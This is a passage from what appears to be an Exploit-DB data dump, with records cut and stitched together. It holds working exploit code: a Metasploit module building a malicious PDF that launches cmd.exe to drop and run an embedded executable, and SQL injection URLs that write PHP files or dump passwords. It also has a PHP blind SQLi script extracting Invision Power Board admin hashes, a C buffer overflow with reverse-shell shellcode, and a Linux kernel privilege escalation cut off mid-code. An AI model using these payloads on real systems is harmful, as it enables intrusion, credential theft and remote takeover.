'http://blog.didierstevens.com/2010/03/29/escape-from-pdf/' ] 				], 			'Payload'	=> 				{ 					'Space'			   => 2048, 					'DisableNops'		=> true, 					'StackAdjustment'	=> -3500, 				}, 			'Platform'	=> 'win', 			'Targets'	=> 				[ 					[ 'Adobe Reader <= v9.3.3 (Windows XP SP3 English)', { 'Ret' => '' } ] 				], 			'DefaultTarget'	=> 0))  		register_options( 			[ 				OptString.new('EXENAME', [ false, 'The Name of payload exe.', 'msf.exe']), 				OptString.new('FILENAME', [ false, 'The output filename.', 'evil.pdf']), 				OptString.new('LAUNCH_MESSAGE', [ false, 'The message to display in the File: area', 					""To view the encrypted content please tick the \""Do not show this message again\"" box and press Open.""]), 			], self.class) 	end  	def exploit  		# Create the pdf 		print_status(""Making PDF"") 		pdf = make_pdf() 		print_status(""Creating '#{datastore['FILENAME']}' file..."") 		file_create(pdf) 	end  	def pdf_exe(payload_exe)  		if !(payload_exe and payload_exe.length > 0) 			print_status(""Using '#{datastore['PAYLOAD']}' as payload..."") 			payload_exe = generate_payload_exe 			hex_payload = Rex::Text.to_hex(payload_exe) 		else 			print_status(""Using '#{datastore['EXENAME']}' as payload..."") 			hex_payload = Rex::Text.to_hex_dump(payload_exe,16) 		end  		return hex_payload 	end  	def ioDef(id) 		""%d 0 obj"" % id 	end  	def ioRef(id) 		""%d 0 R"" % id 	end  	#http://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/ 	def nObfu(str) 		result = """" 		str.scan(/./u) do |c| 			if rand(2) == 0 and c.upcase >= 'A' and c.upcase <= 'Z' 				result << ""#%x"" % c.unpack(""C*"")[0] 			else 				result << c 			end 		end 		result 	end  	def ASCIIHexWhitespaceEncode(str) 		result = """" 		whitespace = """" 		str.each_byte do |b| 			result << whitespace << ""%02x"" % b 			whitespace = "" "" * (rand(3) + 1) 		end 		result << "">"" 	end  	def make_pdf()  		file_name = datastore['FILENAME'] 		exe_name = datastore['EXENAME'] 		launch_msg = datastore['LAUNCH_MESSAGE']  		xref = [] 		eol = ""\x0d\x0a"" 		endobj = ""endobj"" << eol  		pdf = ""%PDF-1.5"" << eol 		payload_exe = generate_payload_exe 		hex_payload = Rex::Text.to_hex(payload_exe) 		pdf << hex_payload << eol 		pdf << ioDef(1) << nObfu(""<</Type/Catalog/Outlines "") << ioRef(2) << nObfu(""/Pages "") << ioRef(3) << nObfu(""/OpenAction "") << ioRef(5) << "">>"" << endobj 		xref << pdf.length 		pdf << ioDef(2) << nObfu(""<</Type/Outlines/Count 0>>"") << endobj 		xref << pdf.length 		pdf << ioDef(3) << nObfu(""<</Type/Pages/Kids["") << ioRef(4) << nObfu(""]/Count 1>>"") << endobj 		xref << pdf.length 		pdf << ioDef(4) << nObfu(""<</Type/Page/Parent "") << ioRef(3) << nObfu(""/MediaBox[0 0 612 792]>>"") << endobj 		xref << pdf.length 		pdf << ioDef(5) << nObfu(""<</Type/Action/S/Launch/Win "") << ""<< "" 		pdf << ""/F (cmd.exe) /P (/C echo Set o=CreateObject^(\""Scripting.FileSystemObject\""^):Set f=o.OpenTextFile^(\""#{file_name}\"",1,True^):"" 		pdf << ""f.SkipLine:Set w=CreateObject^(\""WScript.Shell\""^):Set g=o.OpenTextFile^(w.ExpandEnvironmentStrings^(\""%TEMP%\""^)+\""\\\\#{exe_name}\"",2,True^):a=Split^(Trim^(Replace^(f.ReadLine,\""\\\\x\"",\"" \""^)^)^):"" 		pdf << ""for each x in a:g.Write^(Chr^(\""&h\"" ^& x^)^):next:g.Close:f.Close > 1.vbs && cscript //B 1.vbs && start %TEMP%\\\\#{exe_name} && del /F 1.vbs"" 		pdf << eol << eol << eol << ""#{launch_msg})"" 		pdf << "">>>>"" << endobj 		xref << pdf.length 		xrefPosition = pdf.length 		pdf << ""xref"" << eol 		pdf << ""0 %d"" % (xref.length + 1) << eol 		pdf << ""0000000000 65535 f"" << eol 		xref.each do |index| 			pdf << ""%010d 00000 n"" % index << eol 		end 		pdf << ""trailer"" << nObfu(""<</Size %d/Root "" % (xref.length + 1)) << ioRef(1) << "">>"" << eol 		pdf << ""startxref"" << eol 		pdf << xrefPosition.to_s() << eol 		pdf << ""%%EOF"" << eol  	end end",local,local,1
37048,"osCMax 2.5 - '/admin/stats_monthly_sales.php?status' SQL Injection source: https://www.securityfocus.com/bid/52886/info            osCMax is prone to multiple SQL-injection vulnerabilities and multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied input.            Exploiting these vulnerabilities could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.            osCMax 2.5.0 is vulnerable; prior versions may also be affected.   http://www.example.com/admin/stats_monthly_sales.php?status=0 union select '<? php_code ?>' INTO OUTFILE '../../../path/to/site/file.php'",remote,webapps,1
41104,"Yoga and Fitness Website Script - SQL Injection # # # # #  # Vulnerability: SQL Injection # Date: 18.01.2017 # Vendor Homepage: http://www.scriptgiant.com/ # Script Name: Yoga and Fitness Website Script # Script Buy Now: http://www.popularclones.com/products/Yoga-and-Fitness-Website # Author: Ihsan Sencan # Author Web: http://ihsan.net # Mail : ihsan[beygir]ihsan[nokta]net # # # # # # SQL Injection/Exploit : # http://localhost/[PATH]/promo_classes.php?cid=[SQL] # http://localhost/[PATH]/style.php?s=[SQL] # http://localhost/[PATH]/teacherindi.php?t=[SQL] # E.t.c.... Other files, too. SQL There are security vulnerabilities. # # # # #",remote,webapps,1
7552,"REDPEACH CMS - SQL Injection ############################################################### # #           REDPEACH CMS - SQL Injection Vulnerability      #	    http://www.redpeach.de/ #                                                              #      Vulnerability discovered by: Lidloses_Auge              #      Greetz to:                   -=Player=- , Suicide, g4ms3, enco, #                                   Palme, GPM, karamble, Free-Hack #      Date:                        23.12.2008 # ############################################################### #                                                              #      Admin Panel: [Target]/admin/login.php #      Description: The Files ""index.php"" and ""page.php"" contain #		    vulnerable SQL Querys at the GET Parameter ""zv"". #		    In the most cases you need a table prefix, which #		    is similar to the websites' name, so you can guess. #		    After table prefix there's ""_user"". #		    The important column names are ""username"" and ""password"". #		    The number of columns is 8 almost everytime. # #      Example:     http://www.website.com/page.php?pageid=1&zv=null+union+select+concat(username,0x3a,password),2,3,4,5,6,7,8+from+website_user+limit+0,1/* #                                                              ###############################################################  # milw0rm.com [2008-12-22]",remote,webapps,1
6507,"Invision Power Board 2.3.5 - SQL Injection <?php error_reporting(E_ALL); /////////////////////////////////////////////////////////////////////// /////////////////////////////////////////////////////////////////////// // IPB <= 2.3.5 sql injection exploit // Version 1.0 // written by Janek Vind ""waraxe"" // Estonia, Tartu // http://www.waraxe.us/ // 20. september 2008 // based on DarkFig's advisory // http://acid-root.new.fr/?0:18 // // FEATURES: // 1. Fetching algorithm optimized for speed // 2. Attack goes through $_POST, so no suspicious logs // 3. Pretesting saves time if IPB is not vulnerable // // More useful tools: http://www.waraxe.us/tools/ // Waraxe forums: http://www.waraxe.us/forums.html  // // NB! This exploit is meant to be run as php CLI! // http://www.php.net/features.commandline /////////////////////////////////////////////////////////////////////// /////////////////////////////////////////////////////////////////////// //===================================================================== $url = 'http://localhost/ipb.2.3.5/'; $id = 1;// ID of the target user, default value ""1"" is admin's ID $prefix = 'ibf_';// IPB table prefix, default is ""ibf_"" # Proxy settings # Be sure to use proxy :) //$proxy_ip_port = '127.0.0.1:8118'; //$proxy_user_password = 'someuser:somepassword'; $outfile = './ipblog.txt';// Log file //====================================================================== /////////////////////////////////////////////////////////////////////// // Don't mess below this line, unless you know the stuff ;) /////////////////////////////////////////////////////////////////////// //===================================================================== /////////////////////////////////////////////////////////////////////// $cli = php_sapi_name() === 'cli'; //===================================================================== // Warning, if executed from webserver //===================================================================== if(!$cli) { 	if(!isset($_REQUEST['wtf-is-cli'])) 	{  		echo ""<html><head><title>Attention!</title></head>\n""; 		echo ""<body><br /><br /><center>\n""; 		echo ""<h1>Warning!</h1>\n""; 		echo ""This exploit is meant to be used as php CLI script!<br />\n""; 		echo ""More information:<br />\n""; 		echo ""<a href=\""http://www.google.com/search?hl=en&q=php+cli+windows\"" target=\""_blank\"">http://www.google.com/search?hl=en&q=php+cli+windows</a><br />\n""; 		echo ""Still, you can try to run it from webserver.<br />\n""; 		echo ""Just press the button below and prepare for long waiting<br />\n""; 		echo ""And learn to use php CLI next time, please ...<br />\n""; 		echo ""<form method=\""get\"">\n""; 		echo ""<input type=\""submit\"" name=\""wtf-is-cli\"" value=\""Let me in, i don't care\"">\n""; 		echo ""</form>\n""; 		echo ""</center></body></html>\n""; 		exit; 	} 	else 	{ 		// Let's try to maximize our chances without CLI 		@set_time_limit(0); 	} } //===================================================================== xecho(""Target: $url\n""); xecho(""Sql table prefix: $prefix\n""); xecho(""Testing target URL ... \n""); test_target_url(); xecho(""Target URL seems to be valid\n""); xecho(""Testing target ID ... \n""); test_target_id(); xecho(""Target ID seems to be valid\n"");  $hash = get_hash(); $salt = get_salt();  add_line(""Target: $url""); add_line(""User ID: $id""); add_line(""Hash: $hash""); add_line(""Salt: $salt""); add_line(""------------------------------------------"");  xecho(""\n------------------------------------------\n""); xecho(""Hash: $hash\n""); xecho(""Salt: $salt""); xecho(""\n------------------------------------------\n"");  xecho(""\nQuestions and feedback - http://www.waraxe.us/ \n""); die(""See ya! :) \n""); ////////////////////////////////////////////////////////////////////// ////////////////////////////////////////////////////////////////////// function test_target_url() { 	global $url; 	 	$post = 'act=xmlout&do=check-display-name&name=somethingfoobarkind%2527 OR 1=1-- '; 	$buff = trim(make_post($url, $post, '', $url)); 	if($buff !== 'found') 	{ 		die('Invalid response, target URL not valid? Exiting ...'); 	} } ////////////////////////////////////////////////////////////////////// function test_target_id() { 	global $url, $prefix, $id; 	 	$post = 'UNION SELECT 1,1 FROM ' . $prefix . 'members_converge WHERE converge_id=' . $id . ' AND LENGTH(converge_pass_hash)=32'; 	if(!test_condition($post)) 	{ 		die('Invalid response, target ID not valid? Exiting ...'); 	} } /////////////////////////////////////////////////////////////////////// function get_salt() { 	$len = 5; 	$out = ''; 	 	xecho(""Finding salt ...\n""); 	 	for($i = 1; $i < $len + 1; $i ++) 	{ 		$ch = get_saltchar($i); 		xecho(""Got pos $i --> $ch\n""); 		$out .= ""$ch""; 		xecho(""Current salt: $out \n""); 	} 	 	xecho(""\nFinal salt: $out\n\n""); 	 	return $out; } /////////////////////////////////////////////////////////////////////// function get_saltchar($pos) { 	global $prefix, $id;  	$char = ''; 	$min = 32; 	$max = 128; 	$pattern = 'UNION SELECT 1,1 FROM ' . $prefix . ""members_converge WHERE converge_id=$id AND ORD(SUBSTR(converge_pass_salt,$pos,1))""; 	$curr = 0; 	 	while(1) 	{ 		$area = $max - $min; 		if($area < 2 ) 		{ 			$post = $pattern . ""=$max""; 			$eq = test_condition($post); 			 			if($eq) 			{ 				$char = chr($max); 			} 			else 			{ 				$char = chr($min); 			} 			 			break; 		} 		 		$half = intval(floor($area / 2)); 		$curr = $min + $half; 		 		$post = $pattern . '%253e' . $curr; 		 		$bigger = test_condition($post); 		 		if($bigger) 		{ 			$min = $curr; 		} 		else 		{ 			$max = $curr; 		}  		xecho(""Current test: $curr-$max-$min\n""); 	} 	 	return $char; } /////////////////////////////////////////////////////////////////////// function get_hash() { 	$len = 32; 	$out = ''; 	 	xecho(""Finding hash ...\n""); 	 	for($i = 1; $i < $len + 1; $i ++) 	{ 		$ch = get_hashchar($i); 		xecho(""Got pos $i --> $ch\n""); 		$out .= ""$ch""; 		xecho(""Current hash: $out \n""); 	} 	 	xecho(""\nFinal hash: $out\n\n""); 	 	return $out; } /////////////////////////////////////////////////////////////////////// function get_hashchar($pos) { 	global $prefix, $id;  	$char = ''; 	$pattern = 'UNION SELECT 1,1 FROM ' . $prefix . ""members_converge WHERE converge_id=$id AND ORD(SUBSTR(converge_pass_hash,$pos,1))"";  	// First let's determine, if it's number or letter 	$post = $pattern . '%253e57'; 	$letter = test_condition($post); 	 	if($letter) 	{ 		$min = 97; 		$max = 102; 		xecho(""Char to find is [a-f]\n""); 	} 	else 	{ 		$min = 48; 		$max = 57; 		xecho(""Char to find is [0-9]\n""); 	}  	$curr = 0; 	 	while(1) 	{ 		$area = $max - $min; 		if($area < 2 ) 		{ 			$post = $pattern . ""=$max""; 			$eq = test_condition($post); 			 			if($eq) 			{ 				$char = chr($max); 			} 			else 			{ 				$char = chr($min); 			} 			 			break; 		} 		 		$half = intval(floor($area / 2)); 		$curr = $min + $half; 		 		$post = $pattern . '%253e' . $curr; 		 		$bigger = test_condition($post); 		 		if($bigger) 		{ 			$min = $curr; 		} 		else 		{ 			$max = $curr; 		}  		xecho(""Current test: $curr-$max-$min\n""); 	} 	 	return $char; } /////////////////////////////////////////////////////////////////////// function test_condition($p) { 	global $url; 	 	$bret = false; 	$maxtry = 10; 	$try = 1; 		 	$pattern = 'act=xmlout&do=check-display-name&name=%%2527 OR 1=%%2522%%2527%%2522 %s OR 1=%%2522%%2527%%2522-- '; 	$post = sprintf($pattern, $p); 	 	while(1) 	{ 		$buff = trim(make_post($url, $post, '', $url));  		if($buff === 'found') 		{ 			$bret = true; 			break; 		} 		elseif($buff === 'notfound') 		{ 			break; 		} 		elseif(strpos($buff, '<title>IPS Driver Error</title>') !== false) 		{ 			die(""Sql error! Wrong prefix?\nExiting ... ""); 		} 		else 		{ 			xecho(""test_condition() - try $try - invalid return value ...\n""); 			$try ++; 			if($try > $maxtry) 			{ 				die(""Too many tries - exiting ...\n""); 			} 			else 			{ 				xecho(""Trying again - try $try ...\n""); 			} 		} 	} 	 	return $bret; } /////////////////////////////////////////////////////////////////////// function make_post($url, $post_fields='', $cookie = '', $referer = '', $headers = FALSE) { 	$ch = curl_init(); 	$timeout = 120; 	curl_setopt ($ch, CURLOPT_URL, $url); 	curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 	curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout); 	curl_setopt($ch, CURLOPT_POST, 1);  	curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);  	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0); 	curl_setopt ($ch, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)'); 	 	if(!empty($GLOBALS['proxy_ip_port'])) 	{ 		curl_setopt($ch, CURLOPT_PROXY, $GLOBALS['proxy_ip_port']); 		 		if(!empty($GLOBALS['proxy_user_password'])) 		{ 			curl_setopt($ch, CURLOPT_PROXYUSERPWD, $GLOBALS['proxy_user_password']);  		} 	} 	 	if(!empty($cookie)) 	{ 		curl_setopt ($ch, CURLOPT_COOKIE, $cookie); 	}   	if(!empty($referer)) 	{ 		curl_setopt ($ch, CURLOPT_REFERER, $referer); 	}  	if($headers === TRUE) 	{ 		curl_setopt ($ch, CURLOPT_HEADER, TRUE); 	} 	else 	{ 		curl_setopt ($ch, CURLOPT_HEADER, FALSE); 	}  	$fc = curl_exec($ch); 	curl_close($ch); 	 	return $fc; } /////////////////////////////////////////////////////////////////////// function add_line($line) { 	global $outfile; 	 	$line .= ""\n""; 	$fh = fopen($outfile, 'ab'); 	fwrite($fh, $line); 	fclose($fh); 	 } /////////////////////////////////////////////////////////////////////// function xecho($line) { 	if($GLOBALS['cli']) 	{ 		echo ""$line""; 	} 	else 	{ 		$line = nl2br(htmlspecialchars($line)); 		echo ""$line""; 	} } ////////////////////////////////////////////////////////////////////// ?>  # milw0rm.com [2008-09-21]",remote,webapps,1
36859,"Foxit Reader PDF 7.1.3.320 - Parsing Memory Corruption #####################################################################################  Application:   Foxit Reader PDF Parsing  Memory Corruption  Platforms:   Windows  Versions:   The vulnerabilities are reported in Foxit Reader and Foxit Enterprise Reader versions 7.1.0.306 and 7.1.3.320 and Foxit Phantom PDF versions 7.1.0.306, 7.1.2.311, and 7.1.3.320.  Secunia:   SA63346  {PRL}:   2015-05  Author:   Francis Provencher (Protek Research Lab’s)  Website:   http://www.protekresearchlab.com/  Twitter:   @ProtekResearch  #####################################################################################  1) Introduction 2) Report Timeline 3) Technical details 4) POC  #####################################################################################  =============== 1) Introduction ===============  Foxit Reader is a multilingual freemium PDF tool that can create, view, edit, digitally sign, and print PDF files.[3] Early versions of Foxit Reader were notable for startup performance and small file size.[citation needed] Foxit has been compared favorably toAdobe Reader.[4][5][6] The Windows version allows annotating and saving unfinished PDF forms, FDF import/export, converting to text, highlighting and drawing.  (http://en.wikipedia.org/wiki/Foxit_Reader)  #####################################################################################  ============================ 2) Report Timeline ============================  2015-04-09: Francis Provencher from Protek Research Lab’s found the issue; 2015-04-13: Foxit Security Response Team confirmed the issue; 2015-04-28: Foxit fixed the issue; #####################################################################################  ============================ 3) Technical details ============================  A memory corruption occured within the LZW algorithm that is used to decode GIF. A specifically crafted GIF could lead to a controled memory corruption.  #####################################################################################  ===========  4) POC  ===========  http://protekresearchlab.com/exploits/PRL-2015-05.pdf https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/36859.pdf   ###############################################################################",local,local,1
23509,"YaSoft Switch Off 2.3 - 'swnet.dll' Remote Buffer Overflow // source: https://www.securityfocus.com/bid/9340/info  A vulnerability has been identified in the YaSoft Switch Off software package when handling message requests. The buffer overrun condition exists in the 'swnet.dll' module of the software due to insufficient bounds checking performed by the affected component. The overflow may be caused by sending an excessively long 'message' parameter to the application. This may make it possible for a remote user to execute arbitrary code through a vulnerable server.  /*******************************************************************/ /* [Crpt] Switch Off 2.3 exploit by MrNice [Crpt] */ /* --------------------------------------------------------------- */ /* */ /* Coder : MrNice */ /* Released on : 07/01/2004 */ /* Tested on : 2k Sp0 & Xp sp0 */ /* Advisory : www.securiteam.com/windowsntfocus/5BP011FBPI.html*/ /* Tech : The overflow can be caused by supplying an overly*/ /* long 'message' parameter to the application. */ /* */ /* If a password has been set, you will have to have*/ /* logged in to the server before issuing a */ /* malicious request to cause the overflow. */ /*******************************************************************/ /* www.coromputer.net && #coromputer on underet */ /******C***O***R***O***M***P***U***T***E***R*****2***0***0***4******/  #ifdef _WIN32 #include <winsock.h> #include <windows.h> #define close closesocket #pragma comment (lib,""ws2_32"") #else #include <netinet/in.h> #include <sys/socket.h> #include <arpa/inet.h> #include <netdb.h> #endif  #include <stdio.h> #include <stdlib.h> #include <string.h>  //#define JMP_ESP_2K ""\x1F\xE5\xC7\x77"" //2k sp0 FR //#define JMP_ESP_XP ""\xE7\x80\x9C\x71"" //xp pro sp0 FR  #define JMP_ESP_2K ""\xB8\x64\x75\x71"" #define JMP_ESP_XP ""\xC1\x1C\x35\x77""   char ReversShell[]= //Dexorer without call (ff..) coded by MrNice ""\x83\xEC\x50\xD9\xE1\xD9\x34\x24\x5B\x5B\x5B\x5B\x80\xEB\xE7\x33"" ""\xC9\x66\x81\xC1\x4F\x01\x80\x33\x96\x43\xE2\xFA"" //Reverse Shell from Metasploit ""\x7e\xa6\x96\x96\x96\xd5\xdb\xd2\x96\x71\xef\x50\xef\x7a\x6f\x3c"" ""\xf6\x4f\x9f\x63\x3b\x5d\x7b\x6a\xad\x18\xd8\x98\x7a\xe8\x4e\x74"" ""\xe5\x3b\x4f\x93\x58\xe4\x68\x25\x80\xc1\xc5\xa4\xc9\xa5\xa4\xb8"" ""\xd2\xda\xda\x96\x97\xcd\xc2\x1f\x73\x1f\xcb\x96\xfc\xa6\xcf\xf2"" ""\x1d\x97\x1d\xd6\x9a\x1d\xe6\x8a\x3b\x1d\xce\x9e\x7d\x9a\x1b\xc1"" ""\xb2\xc7\xc4\x69\x46\x1f\x55\xcf\x7d\x86\xfc\x9e\xc8\x97\x78\xfc"" ""\x9e\xcf\x1d\xeb\x96\x16\x6f\x92\xe2\x72\xc7\xc5\x69\xa2\x19\x7e"" ""\x15\x96\x96\x96\xcf\x1f\x92\x18\x74\x7d\xa7\x69\xf0\x17\x7a\x06"" ""\x97\xc2\xfe\x97\x97\x96\x96\x69\xc3\x8e\xc1\xc1\xc1\xc1\xd1\xc1"" ""\xd1\xc1\x69\xc3\x82\x1f\x55\xa7\x69\xfe\x56\x3e\x96\x61\xfe\x94"" ""\x96\xb4\x87\x1f\x77\xfc\x86\xc7\xc5\x69\xc3\x86\x13\x56\xe3\xd2"" ""\x1b\xaa\xb2\xa7\x56\xfc\x83\xcf\x65\x3d\x50\xd2\xb2\x86\xd2\x68"" ""\xd2\xb2\xab\x1f\xca\xb2\xde\x1f\xca\xb2\xda\x1f\xca\xb2\xc6\x1b"" ""\xd2\xb2\x86\xc2\xc6\xc7\xc7\xc7\xd7\xc7\xdf\xc7\xc7\x69\xe3\x96"" ""\xc7\x69\xc3\xbe\x1f\x77\xfe\x69\x69\x69\x69\x69\xa7\x69\xc3\xb2"" ""\xc1\x69\xc3\x9a\x69\xc3\xb6\xc5\xc3\xc0\xc1\x1d\xfa\xb2\x8e\x1d"" ""\xd3\xaa\x1d\xc2\x93\xee\x97\x7c\x1d\xdc\x8e\x1d\xcc\xb6\x97\x7d"" ""\x75\xa4\xdf\x1d\xa2\x1d\x97\x78\xa7\x69\x6a\xa7\x56\x3a\xae\x76"" ""\xe2\x91\x57\x59\x9b\x97\x51\x7d\x64\xad\xea\xb2\x82\xe3\x77\x1d"" ""\xcc\xb2\x97\x7d\xf0\x1d\x9a\xdd\x1d\xcc\x8a\x97\x7d\x1d\x92\x1d"" ""\x97\x7e\x7d\x94\xa7\x56\x1f\x7c\xc9\xc8\xcb\xcd\x54\x9e\x96"";     //Fonction who set the shellcode coded by Kralor[crpt] void set_sc(char *rhost, int rport, char *shellc0de)    {   unsigned int ip=0;   unsigned short port=0;   char *port_to_shell="""",*ip1="""";    ip = inet_addr(rhost); ip1 = (char*)&ip;   shellc0de[182]=ip1[0]^0x96;shellc0de[183]=ip1[1]^0x96;   shellc0de[184]=ip1[2]^0x96; shellc0de[185]=ip1[3]^0x96;    port = htons(rport);   port_to_shell = (char *) &port;   shellc0de[189]=port_to_shell[0]^0x96;   shellc0de[190]=port_to_shell[1]^0x96;     }  void banner()    {     printf(""\n\t [Crpt] Switch Off 2.3 Remote Exploit by MrNice [Crpt]\n"");   printf(""\t\t www.coromputer.net && Undernet #coromputer\n"");         printf(""\t---------------------------------------------------------------\n\n"");    }     void usage(char *exe)    {     printf(""\n\t [Crpt] Switch Off 2.3 Remote Exploit by MrNice [Crpt]\n"");   printf(""\t\t www.coromputer.net && Undernet #coromputer\n"");         printf(""\t---------------------------------------------------------------\n\n"");         printf(""Syntax : %s <ip_vulnerable> <your_ip> <listening_port> <cible>\n"",exe);         printf(""\nCible : \t0 - Windows 2000 (default)\n"");         printf(""\t\t1 - Windows Xp\n\n"");         exit (-1);    }     int main(int argc, char *argv[]) {   int hsocket;    struct hostent *host;     struct in_addr adresseIP;     struct sockaddr_in adressesocket;         char BadString[700],Request[800];    int i,len,cible=0;      #ifdef _WIN32   WSADATA wsaData;   #endif      if(argc<4)      {        usage(argv[0]);    }      if(argc>4)      {        cible=atoi(argv[4]);      }         banner();      #ifdef _WIN32     if(WSAStartup(0x101,&wsaData))      {     printf(""[-] Unable to load winsock\n"");                 exit (-1);      }   else      {        printf(""[+] Winsock loaded\n"");      }   #endif    //Cr�ation de la socket     if((hsocket=socket(AF_INET,SOCK_STREAM,0))==-1)     {     printf(""[-] Can't creat Socket\n"");     exit (-1);     }   else      {     printf(""[+] Socket created\n"");      }        //GetHostByName()    if((host=gethostbyname(argv[1]))==0)    {    printf(""[-] Can't acquire remote info\n"");    close(hsocket);    exit (-1);    }   else      {     printf(""[+] Remote info Acquired\n"");      }     memcpy(&adresseIP,host->h_addr,host->h_length);       //Preparation de la struct sockaddr_in    memset(&adressesocket,0,sizeof(struct sockaddr_in));    adressesocket.sin_family=AF_INET;    adressesocket.sin_port=htons(8000);    memcpy(&adressesocket.sin_addr,host->h_addr,host->h_length);        if(connect(hsocket,(struct sockaddr *)&adressesocket,sizeof(struct sockaddr_in))==-1)    {    printf(""[-] Can't connect on %s:8000\n"",argv[1]);    close(hsocket);    exit (-1);    }   else      {     printf(""[+] Connected on %s:8000\n"",argv[1]);      }      set_sc(argv[2], atoi(argv[3]),ReversShell);   printf(""[+] Reverse ShellCode built\n"",argv[1]);      for(i=0;i<700;i++)      {     BadString[i]=(char)0x90;      }         for(i=260;i<623;i++)      {     BadString[i]=ReversShell[i-260];      }         if(cible==0)      {     memcpy(&BadString[256],JMP_ESP_2K,4);      }   else      {        memcpy(&BadString[256],JMP_ESP_XP,4);      }         BadString[700]=0x00;      memset(Request,'\x00',sizeof(Request));   sprintf(Request,""GET /action.htm?action=SendMsg&message=%s HTTP/1.1\r\n""       ""Host: 10.0.0.6:8000\r\n""       ""\r\n"",BadString);            printf(""[+] BadString constructed\n"");      if((len=send(hsocket,Request,strlen(Request),0))==-1)       {     printf(""[-] Error on sending BadString\n"");       close(hsocket);       exit (-1);       }      else      {      printf(""[+] BadString Sended (%d)\n"",len);      }   return 0;    }",remote,remote,1
14814,"Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32) - 'CAN BCM' Local Privilege Escalation /*  * i-CAN-haz-MODHARDEN.c  *  * Linux Kernel < 2.6.36-rc1 CAN BCM Privilege Escalation Exploit  * Jon Oberheide <jon@oberheide.org>  * http://jon.oberheide.org  *   * Information:  *  *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2959  *  *   Ben Hawkes discovered an integer overflow in the Controller Area Network  *   (CAN) subsystem when setting up frame content and filtering certain   *   messages. An attacker could send specially crafted CAN traffic to crash   *   the system or gain root privileges.   *  * Usage:  *  *   $ gcc i-can-haz-modharden.c -o i-can-haz-modharden  *   $ ./i-can-haz-modharden  *   ...  *   [+] launching root shell!  *   # id  *   uid=0(root) gid=0(root)  *  * Notes:  *  *   The allocation pattern of the CAN BCM module gives us some desirable   *   properties for smashing the SLUB. We control the kmalloc with a 16-byte  *   granularity allowing us to place our allocation in the SLUB cache of our  *   choosing (we'll use kmalloc-96 and smash a shmid_kernel struct for   *   old-times sake). The allocation can also be made in its own discrete   *   stage before the overwrite which allows us to be a bit more conservative   *   in ensuring the proper layout of our SLUB cache.  *  *   To exploit the vulnerability, we first create a BCM RX op with a crafted   *   nframes to trigger the integer overflow during the kmalloc. On the second  *   call to update the existing RX op, we bypass the E2BIG check since the   *   stored nframes in the op is large, yet has an insufficiently sized   *   allocation associated with it. We then have a controlled write into the   *   adjacent shmid_kernel object in the 96-byte SLUB cache.  *  *   However, while we control the length of the SLUB overwrite via a   *   memcpy_fromiovec operation, there exists a memset operation that directly   *   follows which zeros out last_frames, likely an adjacent allocation, with   *   the same malformed length, effectively nullifying our shmid smash. To   *   work around this, we take advantage of the fact that copy_from_user can  *   perform partial writes on x86 and trigger an EFAULT by setting up a   *   truncated memory mapping as the source for the memcpy_fromiovec operation,  *   allowing us to smash the necessary amount of memory and then pop out and   *   return early before the memset operation occurs.  *  *   We then perform a dry-run and detect the shmid smash via an EIDRM errno   *   from shmat() caused by an invalid ipc_perm sequence number. Once we're   *   sure we have a shmid_kernel under our control we re-smash it with the   *   malformed version and redirect control flow to our credential modifying  *   calls mapped in user space.  *  *   Distros: please use grsecurity's MODHARDEN or SELinux's module_request   *   to restrict unprivileged loading of uncommon packet families. Allowing  *   the loading of poorly-written PF modules just adds a non-trivial and   *   unnecessary attack surface to the kernel.   *  *   Targeted for 32-bit Ubuntu Lucid 10.04 (2.6.32-21-generic), but ports   *   easily to other vulnerable kernels/distros. Careful, it could use some   *   post-exploitation stability love as well.  *  *   Props to twiz, sgrakkyu, spender, qaaz, and anyone else I missed that   *   this exploit borrows code from.  */  #include <stdio.h> #include <stdlib.h> #include <stdint.h> #include <string.h> #include <unistd.h> #include <errno.h> #include <fcntl.h> #include <limits.h> #include <inttypes.h> #include <sys/types.h> #include <sys/socket.h> #include <sys/ipc.h> #include <sys/shm.h> #include <sys/mman.h> #include <sys/stat.h>  #define SLUB ""kmalloc-96"" #define ALLOCATION 96 #define FILLER 100  #ifndef PF_CAN #define PF_CAN 29 #endif  #ifndef CAN_BCM #define CAN_BCM 2 #endif  struct sockaddr_can { 	sa_family_t can_family; 	int can_ifindex; 	union { 		struct { uint32_t rx_id, tx_id; } tp; 	} can_addr; };  struct can_frame { 	uint32_t can_id; 	uint8_t can_dlc; 	uint8_t data[8] __attribute__((aligned(8))); };  struct bcm_msg_head { 	uint32_t opcode; 	uint32_t flags; 	uint32_t count; 	struct timeval ival1, ival2; 	uint32_t can_id; 	uint32_t nframes; 	struct can_frame frames[0]; };  #define RX_SETUP 5 #define RX_DELETE 6 #define CFSIZ sizeof(struct can_frame) #define MHSIZ sizeof(struct bcm_msg_head) #define IPCMNI 32768 #define	EIDRM 43 #define HDRLEN_KMALLOC 8  struct list_head { 	struct list_head *next; 	struct list_head *prev; };  struct super_block { 	struct list_head s_list; 	unsigned int s_dev; 	unsigned long s_blocksize; 	unsigned char s_blocksize_bits; 	unsigned char s_dirt; 	uint64_t s_maxbytes; 	void *s_type; 	void *s_op; 	void *dq_op; 	void *s_qcop; 	void *s_export_op; 	unsigned long s_flags; } super_block;  struct mutex { 	unsigned int count; 	unsigned int wait_lock; 	struct list_head wait_list; 	void *owner; };  struct inode { 	struct list_head i_hash; 	struct list_head i_list; 	struct list_head i_sb_list; 	struct list_head i_dentry_list; 	unsigned long i_ino; 	unsigned int i_count; 	unsigned int i_nlink; 	unsigned int i_uid; 	unsigned int i_gid; 	unsigned int i_rdev; 	uint64_t i_version; 	uint64_t i_size; 	unsigned int i_size_seqcount; 	long i_atime_tv_sec; 	long i_atime_tv_nsec; 	long i_mtime_tv_sec; 	long i_mtime_tv_nsec; 	long i_ctime_tv_sec; 	long i_ctime_tv_nsec; 	uint64_t i_blocks; 	unsigned int i_blkbits; 	unsigned short i_bytes; 	